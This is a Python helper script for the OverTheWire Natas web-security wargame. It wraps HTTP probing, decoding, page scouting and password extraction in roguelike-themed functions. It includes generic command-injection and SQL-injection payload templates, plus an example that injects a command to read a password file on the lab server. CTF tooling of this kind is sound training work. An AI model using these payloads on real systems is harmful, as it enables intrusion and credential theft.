#!/usr/bin/env python3
"""
The Roguelike Loadout - Natas Wargame Inventory
Tactical utilities for dungeon crawling through OverTheWire levels
Optimized for iSH on iPhone
"""

import requests
import base64
import binascii
from urllib.parse import quote, unquote
import re

# ===================================================================
# THE CLOAK - Protection from Server Errors
# ===================================================================

def cloak_of_resilience(func):
    """Decorator to absorb HTTP/Connection errors during probing."""
    def wrapper(*args, **kwargs):
        try:
            return func(*args, **kwargs)
        except requests.exceptions.RequestException as e:
            print(f"🛡️ [Cloak Absorbed HTTP Blow]: {e}")
            return None
        except Exception as e:
            print(f"🛡️ [Cloak Absorbed Unknown Blow]: {e}")
            return None
    return wrapper


@cloak_of_resilience
def probe(url, auth=None, params=None, data=None, method='GET', headers=None):
    """
    The basic probe - resilient HTTP request

    Args:
        url: Target URL
        auth: Tuple of (username, password)
        params: GET parameters
        data: POST data
        method: HTTP method
        headers: Additional headers

    Returns:
        Response text or None if failed
    """
    kwargs = {
        'timeout': 10,
        'allow_redirects': True
    }

    if auth:
        kwargs['auth'] = auth
    if params:
        kwargs['params'] = params
    if data:
        kwargs['data'] = data
    if headers:
        kwargs['headers'] = headers

    if method.upper() == 'GET':
        r = requests.get(url, **kwargs)
    elif method.upper() == 'POST':
        r = requests.post(url, **kwargs)
    else:
        r = requests.request(method, url, **kwargs)

    r.raise_for_status()
    return r.text


# ===================================================================
# THE POTION - Decoding Utilities
# ===================================================================

def reveal_vial(data, mode='auto'):
    """
    Instantly tries to decode various encodings

    Args:
        data: Encoded string
        mode: 'auto', 'base64', 'hex', 'url', 'rot13', 'natas8'

    Returns:
        Decoded string or error message
    """
    result = {}

    # Auto-detect and try all
    if mode == 'auto':
        print("🧪 [Potion Brewing]: Trying all decodings...\n")

        # Base64
        try:
            decoded = base64.b64decode(data).decode('utf-8')
            result['base64'] = decoded
            print(f"✅ Base64: {decoded}")
        except:
            print("❌ Base64: Failed")

        # Hex
        try:
            decoded = bytes.fromhex(data).decode('utf-8')
            result['hex'] = decoded
            print(f"✅ Hex: {decoded}")
        except:
            print("❌ Hex: Failed")

        # URL encoding
        try:
            decoded = unquote(data)
            result['url'] = decoded
            print(f"✅ URL: {decoded}")
        except:
            print("❌ URL: Failed")

        # ROT13
        try:
            import codecs
            decoded = codecs.decode(data, 'rot13')
            result['rot13'] = decoded
            print(f"✅ ROT13: {decoded}")
        except:
            print("❌ ROT13: Failed")

        return result

    # Specific decodings
    elif mode == 'base64':
        return base64.b64decode(data).decode('utf-8')

    elif mode == 'hex':
        return bytes.fromhex(data).decode('utf-8')

    elif mode == 'url':
        return unquote(data)

    elif mode == 'rot13':
        import codecs
        return codecs.decode(data, 'rot13')

    elif mode == 'natas8':
        # Natas 8 specific: Reverse -> Hex decode -> Base64 decode
        try:
            decoded = base64.b64decode(bytes.fromhex(data)[::-1])
            result = decoded.decode('utf-8')
            print(f"🧪 [Natas 8 Potion]: {result}")
            return result
        except Exception as e:
            print(f"🧪 [Potion Sours]: {e}")
            return None


def brew_vial(data, mode='base64'):
    """
    Encode data (reverse of reveal_vial)

    Args:
        data: Plain text string
        mode: 'base64', 'hex', 'url', 'natas8'

    Returns:
        Encoded string
    """
    if mode == 'base64':
        return base64.b64encode(data.encode()).decode()

    elif mode == 'hex':
        return data.encode().hex()

    elif mode == 'url':
        return quote(data)

    elif mode == 'natas8':
        # Natas 8 encoding: Base64 -> Hex -> Reverse
        encoded = base64.b64encode(data.encode())
        hexed = encoded.hex()
        return hexed[::-1]


# ===================================================================
# THE WEAPON - Payload Slinger
# ===================================================================

def sling_payload(base_url, auth, bullet, param='needle', extra_params=None):
    """
    Injects a command/payload into a parameter

    Args:
        base_url: Base URL (e.g., http://natas9.natas.labs.overthewire.org)
        auth: Tuple of (username, password)
        bullet: The payload/command to inject
        param: Parameter name (default: 'needle')
        extra_params: Additional parameters

    Returns:
        Response text
    """
    target = f"{base_url}/index.php" if not base_url.endswith('.php') else base_url

    params = {param: bullet, 'submit': 'Search'}

    if extra_params:
        params.update(extra_params)

    print(f"🏹 [Slinging]: {bullet}")
    result = probe(target, auth, params=params)

    if result:
        print(f"🎯 [Hit Confirmed]: {len(result)} bytes received")

    return result


def forge_bullets(command, wrapper='basic'):
    """
    Forge payloads for different scenarios

    Args:
        command: The actual command (e.g., 'cat /etc/passwd')
        wrapper: Injection wrapper type

    Returns:
        List of payload variations
    """
    bullets = []

    if wrapper == 'basic':
        bullets = [
            f"; {command}",
            f"| {command}",
            f"& {command}",
            f"&& {command}",
            f"|| {command}",
        ]

    elif wrapper == 'grep':
        # For Natas 9/10 style grep injection
        bullets = [
            f"; {command} #",
            f"'' ; {command} #",
            f"dictionary.txt ; {command} #",
        ]

    elif wrapper == 'sql':
        bullets = [
            f"' OR 1=1 --",
            f"' OR '1'='1",
            f"admin' --",
            f"' UNION SELECT {command} --",
        ]

    return bullets


# ===================================================================
# THE MAP - Page Analysis
# ===================================================================

def scout_room(url, auth=None):
    """
    Scout a level (page) for interesting elements

    Args:
        url: Target URL
        auth: Authentication tuple

    Returns:
        Dict of interesting findings
    """
    print("🗺️  [Scouting Room]...")

    html = probe(url, auth)
    if not html:
        return {'error': 'Failed to scout'}

    findings = {
        'forms': [],
        'inputs': [],
        'comments': [],
        'links': [],
        'scripts': [],
    }

    # Find forms
    forms = re.findall(r'<form[^>]*>(.*?)</form>', html, re.DOTALL | re.IGNORECASE)
    findings['forms'] = forms

    # Find inputs
    inputs = re.findall(r'<input[^>]*>', html, re.IGNORECASE)
    findings['inputs'] = inputs

    # Find HTML comments
    comments = re.findall(r'<!--(.*?)-->', html, re.DOTALL)
    findings['comments'] = [c.strip() for c in comments]

    # Find links
    links = re.findall(r'href=["\']([^"\']*)["\']', html, re.IGNORECASE)
    findings['links'] = links

    # Find scripts
    scripts = re.findall(r'<script[^>]*>(.*?)</script>', html, re.DOTALL | re.IGNORECASE)
    findings['scripts'] = scripts

    # Print findings
    print(f"\n📋 Forms found: {len(findings['forms'])}")
    print(f"📝 Inputs found: {len(findings['inputs'])}")
    print(f"💬 Comments found: {len(findings['comments'])}")
    print(f"🔗 Links found: {len(findings['links'])}")
    print(f"📜 Scripts found: {len(findings['scripts'])}")

    if findings['comments']:
        print("\n💬 HTML Comments:")
        for c in findings['comments']:
            print(f"   {c[:100]}...")

    return findings


def extract_loot(text, pattern=r'natas\d+'):
    """
    Extract the loot (password) from response

    Args:
        text: Response text
        pattern: Regex pattern for password

    Returns:
        List of matches
    """
    if not text:
        return []

    # Common Natas password patterns
    patterns = [
        r'[a-zA-Z0-9]{32}',  # 32-char alphanumeric
        r'The password for natas\d+ is ([a-zA-Z0-9]+)',
        r'Password: ([a-zA-Z0-9]+)',
    ]

    loot = []
    for p in patterns:
        matches = re.findall(p, text)
        loot.extend(matches)

    # Remove duplicates
    loot = list(set(loot))

    if loot:
        print(f"\n💰 [Loot Found]: {len(loot)} items")
        for item in loot:
            print(f"   {item}")

    return loot


# ===================================================================
# THE JOURNAL - Note Taking
# ===================================================================

def scribe(level, password, notes=""):
    """
    Record your progress in a journal

    Args:
        level: Level number or name
        password: The password/flag
        notes: Optional notes about the solution
    """
    from pathlib import Path
    from datetime import datetime

    journal_path = Path.home() / 'Documents' / 'BugBounty' / 'natas_journal.md'
    journal_path.parent.mkdir(parents=True, exist_ok=True)

    entry = f"""
## Level {level}
**Date**: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
**Password**: `{password}`

{notes}

---
"""

    with open(journal_path, 'a') as f:
        f.write(entry)

    print(f"📖 [Scribed to Journal]: Level {level}")


# ===================================================================
# QUICK HELPERS
# ===================================================================

def natas_auth(level, password):
    """Quick auth tuple creator"""
    return (f'natas{level}', password)


def natas_url(level):
    """Quick URL generator"""
    return f"http://natas{level}.natas.labs.overthewire.org"


def quick_scout(level, password):
    """One-liner to scout a level"""
    auth = natas_auth(level, password)
    url = natas_url(level)
    return scout_room(url, auth)


def quick_run(level, password, bullet):
    """One-liner to sling a payload"""
    auth = natas_auth(level, password)
    url = natas_url(level)
    return sling_payload(url, auth, bullet)


# ===================================================================
# INVENTORY LOADOUT
# ===================================================================

print("""
╔═══════════════════════════════════════════════════════════╗
║         🗡️  ROGUELIKE LOADOUT EQUIPPED 🗡️                ║
╠═══════════════════════════════════════════════════════════╣
║                                                           ║
║  🛡️  CLOAK: probe() - Resilient HTTP requests            ║
║  🧪 POTION: reveal_vial() - Decode mysteries             ║
║  🏹 WEAPON: sling_payload() - Inject commands            ║
║  🗺️  MAP: scout_room() - Recon the level                 ║
║  💰 LOOT: extract_loot() - Find the treasure             ║
║  📖 JOURNAL: scribe() - Record your victories            ║
║                                                           ║
║  Quick Helpers:                                           ║
║    • natas_auth(level, pass) - Create auth               ║
║    • natas_url(level) - Generate URL                     ║
║    • quick_scout(level, pass) - Scout instantly          ║
║    • quick_run(level, pass, bullet) - Attack instantly   ║
║                                                           ║
╚═══════════════════════════════════════════════════════════╝

Ready for the dungeon! 🎯
""")


# Example usage
if __name__ == "__main__":
    print("\n📚 Example Usage:")
    print("""
# Natas 8: Decode the secret
reveal_vial('3d3d516343746d4d6d6c315669563362', mode='natas8')

# Natas 9: Command injection
auth = natas_auth(9, 'your_password_here')
url = natas_url(9)
result = sling_payload(url, auth, "; cat /etc/natas_webpass/natas10")
loot = extract_loot(result)

# Quick scout
findings = quick_scout(10, 'password_here')

# Save your victory
scribe(9, 'found_password', 'Command injection via grep parameter')
    """)
